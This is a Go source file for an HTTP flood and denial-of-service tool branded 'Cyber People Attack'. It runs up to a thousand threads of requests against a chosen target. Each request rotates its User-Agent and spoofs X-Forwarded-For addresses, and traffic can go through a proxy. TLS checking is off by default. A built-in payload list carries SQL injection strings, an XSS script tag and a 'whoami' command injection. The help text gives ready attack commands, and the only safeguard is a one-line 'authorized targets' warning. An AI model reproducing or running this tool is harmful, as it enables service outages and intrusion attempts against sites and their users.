package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

// Warna untuk output
const (
	RED     = "\033[91m"
	GREEN   = "\033[92m"
	CYAN    = "\033[96m"
	YELLOW  = "\033[93m"
	MAGENTA = "\033[95m"
	WHITE   = "\033[97m"
	BOLD    = "\033[1m"
	RESET   = "\033[0m"
)

// Banner CPA - 3 huruf dengan desain keren
const banner = `
%s%s
   ██████╗ ██████╗  █████╗ 
  ██╔════╝██╔══██╗██╔══██╗
  ██║     ██████╔╝███████║
  ██║     ██╔═══╝ ██╔══██║
  ╚██████╗██║     ██║  ██║
   ╚═════╝╚═╝     ╚═╝  ╚═╝
     CYBER PEOPLE ATTACK%s
`

var (
	requestsSent   int64
	requestsFailed int64
	startTime      time.Time
)

type AttackConfig struct {
	TargetURL     string
	Method        string
	Threads       int
	Duration      int
	NumRequests   int
	Timeout       int
	Insecure      bool
	NoColor       bool
	Silent        bool
	DelayMin      int
	DelayMax      int
	CustomPayload string
	PayloadFile   string
	RandomPayload bool
	Proxy         string
}

// User-Agent list
var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
}

// Payload list untuk random payload
var defaultPayloads = []string{
	"{\"data\":\"test\"}",
	"{\"message\":\"hello\"}",
	"{\"flood\":\"attack\"}",
	"{\"bypass\":\"true\"}",
	"{\"cmd\":\"whoami\"}",
	"{\"id\":\"1\"}",
	"{\"username\":\"admin\",\"password\":\"admin\"}",
	"{\"search\":\"' OR '1'='1\"}",
	"{\"username\":\"admin' OR '1'='1\",\"password\":\"any\"}",
	"{\"query\":\"<script>alert('XSS')</script>\"}",
}

func createHTTPClient(timeout int, insecure bool, proxyURL string) *http.Client {
	transport := &http.Transport{
		TLSClientConfig:       &tls.Config{InsecureSkipVerify: insecure},
		MaxIdleConns:          100,
		MaxIdleConnsPerHost:   100,
		IdleConnTimeout:       90 * time.Second,
		DisableCompression:    false,
		ResponseHeaderTimeout: time.Duration(timeout) * time.Second,
	}

	// Set proxy jika ada
	if proxyURL != "" {
		proxy, err := url.Parse(proxyURL)
		if err == nil {
			transport.Proxy = http.ProxyURL(proxy)
		}
	}

	return &http.Client{
		Timeout:   time.Duration(timeout) * time.Second,
		Transport: transport,
	}
}

func getRandomUserAgent() string {
	return userAgents[rand.Intn(len(userAgents))]
}

func getRandomPayload(customPayload string, randomPayload bool) string {
	if randomPayload && len(defaultPayloads) > 0 {
		return defaultPayloads[rand.Intn(len(defaultPayloads))]
	}
	if customPayload != "" {
		return customPayload
	}
	return "flood=attack&bypass=true"
}

func getRandomDelay(minMs, maxMs int) time.Duration {
	if minMs <= 0 && maxMs <= 0 {
		return 0
	}
	if minMs == maxMs {
		return time.Duration(minMs) * time.Millisecond
	}
	delayMs := minMs + rand.Intn(maxMs-minMs+1)
	return time.Duration(delayMs) * time.Millisecond
}

func sendRequest(client *http.Client, targetURL, methodType, customPayload string, randomPayload bool) (int, error) {
	var req *http.Request
	var err error
	var bodyPayload string

	// Tentukan payload
	bodyPayload = getRandomPayload(customPayload, randomPayload)

	switch methodType {
	case "flood":
		req, err = http.NewRequest("POST", targetURL, strings.NewReader(bodyPayload))
		if err == nil {
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
			q := req.URL.Query()
			q.Add("flood", fmt.Sprintf("%d", time.Now().UnixNano()))
			req.URL.RawQuery = q.Encode()
		}
	case "bypass":
		req, err = http.NewRequest("GET", targetURL+"/bypass", nil)
	case "uam":
		req, err = http.NewRequest("GET", targetURL+"/uam", nil)
	case "tls":
		req, err = http.NewRequest("GET", targetURL, nil)
	case "r2":
		req, err = http.NewRequest("GET", targetURL+"/r2", nil)
	case "gyat":
		req, err = http.NewRequest("POST", targetURL+"/gyat", strings.NewReader(bodyPayload))
		if err == nil {
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		}
	case "post":
		req, err = http.NewRequest("POST", targetURL, strings.NewReader(bodyPayload))
		if err == nil {
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		}
	case "json":
		req, err = http.NewRequest("POST", targetURL, strings.NewReader(bodyPayload))
		if err == nil {
			req.Header.Set("Content-Type", "application/json")
		}
	case "https", "get":
		req, err = http.NewRequest("GET", targetURL, nil)
	default:
		req, err = http.NewRequest("GET", targetURL, nil)
	}

	if err != nil {
		return 0, err
	}

	// Set headers
	req.Header.Set("User-Agent", getRandomUserAgent())
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("X-Forwarded-For", fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255)))

	resp, err := client.Do(req)
	if err != nil {
		return 0, err
	}
	defer resp.Body.Close()

	return resp.StatusCode, nil
}

func worker(client *http.Client, config *AttackConfig, wg *sync.WaitGroup, stop <-chan struct{}) {
	defer wg.Done()

	for {
		select {
		case <-stop:
			return
		default:
			statusCode, err := sendRequest(client, config.TargetURL, config.Method, config.CustomPayload, config.RandomPayload)

			if err != nil {
				atomic.AddInt64(&requestsFailed, 1)
				if !config.Silent && !config.NoColor {
					fmt.Printf("%s[FAIL]%s %s -> %v\n", RED, RESET, strings.ToUpper(config.Method), err)
				}
			} else {
				atomic.AddInt64(&requestsSent, 1)
				if !config.Silent && !config.NoColor && statusCode >= 200 && statusCode < 400 {
					fmt.Printf("%s[%s]%s %s -> %sStatus: %d%s\n",
						CYAN, strings.ToUpper(config.Method), RESET, config.TargetURL,
						GREEN, statusCode, RESET)
				} else if !config.Silent && !config.NoColor {
					fmt.Printf("%s[%s]%s %s -> %sStatus: %d%s\n",
						CYAN, strings.ToUpper(config.Method), RESET, config.TargetURL,
						RED, statusCode, RESET)
				}
			}

			// Random delay
			if config.DelayMin > 0 || config.DelayMax > 0 {
				delay := getRandomDelay(config.DelayMin, config.DelayMax)
				if delay > 0 {
					time.Sleep(delay)
				}
			}
		}
	}
}

func printStats(stopStats chan struct{}, noColor, silent bool) {
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			elapsed := time.Since(startTime).Seconds()
			sent := atomic.LoadInt64(&requestsSent)
			failed := atomic.LoadInt64(&requestsFailed)
			var rps float64
			if elapsed > 0 {
				rps = float64(sent) / elapsed
			}

			if !silent {
				if !noColor {
					fmt.Printf("\n%s[STATS]%s Sent: %d | Failed: %d | RPS: %.2f | Time: %.0fs\n",
						YELLOW, RESET, sent, failed, rps, elapsed)
				} else {
					fmt.Printf("[STATS] Sent: %d | Failed: %d | RPS: %.2f | Time: %.0fs\n",
						sent, failed, rps, elapsed)
				}
			}
		case <-stopStats:
			return
		}
	}
}

func runAttack(config *AttackConfig) {
	if !config.NoColor && !config.Silent {
		fmt.Printf(banner, BOLD, CYAN, RESET)
	}

	if !config.Silent {
		fmt.Printf("%s⚠️  CPA ATTACK STARTED ⚠️%s\n", RED, RESET)
		fmt.Printf("   Target       : %s\n", config.TargetURL)
		fmt.Printf("   Method       : %s\n", strings.ToUpper(config.Method))
		fmt.Printf("   Threads      : %d\n", config.Threads)
		if config.Duration > 0 {
			fmt.Printf("   Duration     : %ds\n", config.Duration)
		}
		if config.NumRequests > 0 {
			fmt.Printf("   Requests     : %d\n", config.NumRequests)
		}
		fmt.Printf("   Timeout      : %ds\n", config.Timeout)
		if config.DelayMin > 0 || config.DelayMax > 0 {
			fmt.Printf("   Delay        : %d-%d ms\n", config.DelayMin, config.DelayMax)
		}
		if config.CustomPayload != "" {
			fmt.Printf("   Custom Payload: %s\n", config.CustomPayload)
		}
		if config.RandomPayload {
			fmt.Printf("   Random Payload: ENABLED\n")
		}
		if config.Proxy != "" {
			fmt.Printf("   Proxy        : %s\n", config.Proxy)
		}
		fmt.Println()
	}

	client := createHTTPClient(config.Timeout, config.Insecure, config.Proxy)

	stopWorkers := make(chan struct{})
	stopStats := make(chan struct{})
	var wg sync.WaitGroup

	startTime = time.Now()
	atomic.StoreInt64(&requestsSent, 0)
	atomic.StoreInt64(&requestsFailed, 0)

	go printStats(stopStats, config.NoColor, config.Silent)

	// Start workers
	for i := 0; i < config.Threads; i++ {
		wg.Add(1)
		go worker(client, config, &wg, stopWorkers)
	}

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	if config.Duration > 0 {
		select {
		case <-time.After(time.Duration(config.Duration) * time.Second):
			if !config.Silent {
				fmt.Printf("\n%s⏱️  Time limit reached.%s\n", YELLOW, RESET)
			}
		case <-sigChan:
			if !config.Silent {
				fmt.Printf("\n%s⚠️  Interrupted by user.%s\n", RED, RESET)
			}
		}
	} else if config.NumRequests > 0 {
		for {
			sent := atomic.LoadInt64(&requestsSent)
			if sent >= int64(config.NumRequests) {
				if !config.Silent {
					fmt.Printf("\n%s📊 Request limit reached.%s\n", GREEN, RESET)
				}
				break
			}
			select {
			case <-sigChan:
				if !config.Silent {
					fmt.Printf("\n%s⚠️  Interrupted by user.%s\n", RED, RESET)
				}
				goto stop
			default:
			}
			time.Sleep(100 * time.Millisecond)
		}
	} else {
		if !config.Silent {
			fmt.Printf("%s♾️  Running until Ctrl+C.%s\n", CYAN, RESET)
		}
		<-sigChan
		if !config.Silent {
			fmt.Printf("\n%s⚠️  Stopping CPA...%s\n", RED, RESET)
		}
	}

stop:
	close(stopWorkers)
	wg.Wait()
	close(stopStats)

	elapsed := time.Since(startTime).Seconds()
	sent := atomic.LoadInt64(&requestsSent)
	failed := atomic.LoadInt64(&requestsFailed)

	// Validasi angka untuk mencegah overflow
	if sent < 0 {
		sent = 0
	}
	if failed < 0 {
		failed = 0
	}

	success := sent - failed
	if success < 0 {
		success = 0
	}

	var rps float64
	if elapsed > 0 {
		rps = float64(sent) / elapsed
	}

	var successRate float64
	if sent > 0 {
		successRate = float64(success) / float64(sent) * 100
	}

	if !config.Silent {
		fmt.Printf("\n%s========== CPA FINAL REPORT ==========%s\n", CYAN, RESET)
		fmt.Printf("   Method       : %s\n", strings.ToUpper(config.Method))
		fmt.Printf("   Target       : %s\n", config.TargetURL)
		fmt.Printf("   Duration     : %.2f seconds\n", elapsed)
		fmt.Printf("   Total Req    : %d\n", sent)
		fmt.Printf("   Successful   : %d\n", success)
		fmt.Printf("   Failed       : %d\n", failed)
		fmt.Printf("   Success Rate : %.2f%%\n", successRate)
		fmt.Printf("   Avg RPS      : %.2f\n", rps)
		if config.DelayMin > 0 || config.DelayMax > 0 {
			fmt.Printf("   Delay        : %d-%d ms\n", config.DelayMin, config.DelayMax)
		}
		if config.CustomPayload != "" {
			fmt.Printf("   Custom Payload: %s\n", config.CustomPayload)
		}
		fmt.Printf("%s========================================%s\n\n", CYAN, RESET)
	} else {
		fmt.Printf("CPA finished: %d requests, %d success, %.2f%% success rate, %.2f RPS\n", sent, success, successRate, rps)
	}
}

func showMethods() {
	fmt.Printf(`
%s🔥 CPA - AVAILABLE METHODS 🔥%s

   %sGET METHODS:%s
   ├── https      - Standard HTTPS GET request
   ├── get        - Alias for https
   ├── bypass     - GET to /bypass endpoint
   ├── uam        - GET to /uam endpoint  
   ├── tls        - GET with TLS configuration
   └── r2         - GET to /r2 endpoint

   %sPOST METHODS:%s
   ├── flood      - POST flood attack with random data
   ├── gyat       - POST to /gyat endpoint
   ├── post       - Custom POST with payload
   └── json       - POST with JSON payload

%s📝 USAGE EXAMPLES:%s

   # Basic attack
   ./cpa -target https://example.com -method flood -threads 100 -duration 60

   # With custom payload
   ./cpa -target https://example.com -method post -payload "username=admin&password=123" -threads 50

   # With random payload & delay
   ./cpa -target https://example.com -method post -random-payload -delay-min 100 -delay-max 500

   # Using proxy
   ./cpa -target https://example.com -method flood -proxy http://127.0.0.1:8080

   # JSON attack
   ./cpa -target https://api.example.com -method json -payload '{"key":"value"}' -threads 100

%s⚠️  WARNING: Use only on authorized targets! %s

`, CYAN, RESET,
		GREEN, RESET, YELLOW, RESET,
		YELLOW, RESET,
		RED, RESET)
}

func main() {
	rand.Seed(time.Now().UnixNano())

	// Command line flags
	target := flag.String("target", "", "Target URL (required)")
	method := flag.String("method", "https", "Attack method: https, flood, bypass, uam, tls, r2, gyat, post, json")
	threads := flag.Int("threads", 50, "Number of concurrent threads (max 200 recommended)")
	duration := flag.Int("duration", 0, "Attack duration in seconds")
	requests := flag.Int("requests", 0, "Number of requests to send")
	timeout := flag.Int("timeout", 5, "HTTP timeout in seconds")
	insecure := flag.Bool("insecure", true, "Skip TLS verification")
	noColor := flag.Bool("no-color", false, "Disable colored output")
	silent := flag.Bool("silent", false, "Silent mode (no output except final)")
	delayMin := flag.Int("delay-min", 0, "Minimum delay between requests (milliseconds)")
	delayMax := flag.Int("delay-max", 0, "Maximum delay between requests (milliseconds)")
	payload := flag.String("payload", "", "Custom payload for POST requests")
	randomPayload := flag.Bool("random-payload", false, "Use random payload from predefined list")
	proxy := flag.String("proxy", "", "Proxy URL (e.g., http://127.0.0.1:8080)")
	showHelp := flag.Bool("help", false, "Show help")
	listMethods := flag.Bool("methods", false, "Show attack methods")

	flag.Parse()

	if *listMethods {
		showMethods()
		return
	}

	if *showHelp || *target == "" {
		fmt.Printf("%s🔥 CPA - Cyber People Attack Tool %s\n", CYAN, RESET)
		fmt.Printf("Usage: %s [options]\n\n", os.Args[0])
		flag.PrintDefaults()
		showMethods()
		return
	}

	// Validasi threads - jangan terlalu banyak
	if *threads > 500 {
		fmt.Printf("%s⚠️  Warning: %d threads is too high! Recommended max 200.%s\n", YELLOW, *threads, RESET)
	}
	if *threads > 1000 {
		fmt.Printf("%s[ERROR]%s Threads cannot exceed 1000\n", RED, RESET)
		return
	}

	// Validasi delay
	if *delayMin < 0 {
		*delayMin = 0
	}
	if *delayMax < 0 {
		*delayMax = 0
	}
	if *delayMin > *delayMax && *delayMax > 0 {
		*delayMin, *delayMax = *delayMax, *delayMin
	}

	// Validasi method
	validMethods := map[string]bool{
		"flood": true, "bypass": true, "uam": true,
		"tls": true, "https": true, "r2": true, "gyat": true,
		"get": true, "post": true, "json": true,
	}
	if !validMethods[*method] {
		fmt.Printf("%s[ERROR]%s Invalid method: %s\n", RED, RESET, *method)
		showMethods()
		return
	}

	// Prioritaskan duration jika keduanya diisi
	if *duration > 0 && *requests > 0 {
		if !*silent {
			fmt.Printf("%s⚠️  Both duration and requests set. Using duration.%s\n", YELLOW, RESET)
		}
		*requests = 0
	}

	config := &AttackConfig{
		TargetURL:     *target,
		Method:        *method,
		Threads:       *threads,
		Duration:      *duration,
		NumRequests:   *requests,
		Timeout:       *timeout,
		Insecure:      *insecure,
		NoColor:       *noColor,
		Silent:        *silent,
		DelayMin:      *delayMin,
		DelayMax:      *delayMax,
		CustomPayload: *payload,
		RandomPayload: *randomPayload,
		Proxy:         *proxy,
	}

	runAttack(config)
}
